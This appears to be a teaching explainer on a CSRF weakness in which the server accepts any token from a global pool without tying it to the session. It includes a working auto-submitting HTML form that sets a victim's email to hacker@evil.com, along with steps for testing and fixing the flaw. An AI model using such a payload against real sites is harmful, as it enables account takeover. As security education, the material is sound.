
---

## The vulnerability in plain English:

Normally, each user gets their **own unique CSRF token** tied to their session.  
But in this broken implementation, the server keeps a **big shared bucket of all tokens ever issued** to anyone.

If *any* token from the bucket appears in a request, the server accepts it — even if it belongs to a different user.

---

## How it should work (secure):

| User | Session ID | Their CSRF token |
|------|------------|------------------|
| Victim | `abc123` | `token_victim_XYZ` |
| Attacker | `xyz789` | `token_attacker_ABC` |

Server checks: *"Does the token in this request match the session ID?"*  
- Victim using `token_victim_XYZ` with session `abc123` → ✅ Allowed  
- Attacker using `token_attacker_ABC` with session `xyz789` → ✅ Allowed  
- Attacker trying to use `token_attacker_ABC` with victim's session `abc123` → ❌ Rejected

---

## How the vulnerable version works:

Server keeps a global pool:  
`{ "token_victim_XYZ", "token_attacker_ABC", ... }`

Server checks: *"Is this token anywhere in the pool?"*  
- Victim using `token_victim_XYZ` → ✅ In pool → Allowed  
- Attacker using `token_attacker_ABC` → ✅ In pool → Allowed  
- Attacker using `token_attacker_ABC` with victim's session → ✅ Still in pool → **Allowed (vulnerable!)**

---

## Step-by-step attack:

### Step 1: Attacker gets their own valid token

Attacker logs into the application normally:

```
POST /login
username=attacker&password=hackme

Response includes form with:
<input type="hidden" name="csrf" value="ATTACKER_TOKEN_123">
```

Attacker now knows a valid token: `ATTACKER_TOKEN_123`

---

### Step 2: Attacker crafts the CSRF attack using THEIR token

```html
<html>
<body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="csrf" value="ATTACKER_TOKEN_123">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

---

### Step 3: Victim visits the attacker's page while logged in

Victim's browser sends:

```
POST /email/change
Cookie: session=VICTIM_SESSION
csrf=ATTACKER_TOKEN_123&email=hacker@evil.com
```

---

### Step 4: Server checks the token

Server asks: *"Is ATTACKER_TOKEN_123 in my global pool of valid tokens?"*  
✅ Yes (attacker got it earlier)

Server DOES NOT ask: *"Does this token belong to VICTIM_SESSION?"*  
So it accepts the request → Email changed to hacker's address

---

## Why this is dangerous:

The attacker doesn't need to steal the victim's token.  
They just use **their own token** from **their own account** — and the server accepts it for any user.

---

## Simple analogy:

Imagine a gym with a keycard system:

**Secure version:**  
Each person's keycard only opens their own locker. Attacker's keycard can't open victim's locker.

**Vulnerable version (global pool):**  
There's a master list of all keycard numbers ever issued. Any keycard on the list opens any locker.  
Attacker uses their own keycard → opens victim's locker → steals everything.

---

## How to test for this vulnerability:

1. **Create two accounts** in the application (victim and attacker)
2. **Log in as attacker** → capture a valid CSRF token from a form
3. **Log in as victim** in a different browser/incognito window
4. **Send a request** (e.g., change email) using the **attacker's token** with the **victim's session**
5. If the request succeeds → the token is not tied to the session

---

## Key takeaway:

> A CSRF token is useless if it's globally valid. The server must check that the token belongs **specifically to the session making the request** — not just that it's a "valid token" from anywhere.

**Secure check:**  
`token matches session.getToken()`

**Vulnerable check:**  
`token exists in globalTokenList` ← This is broken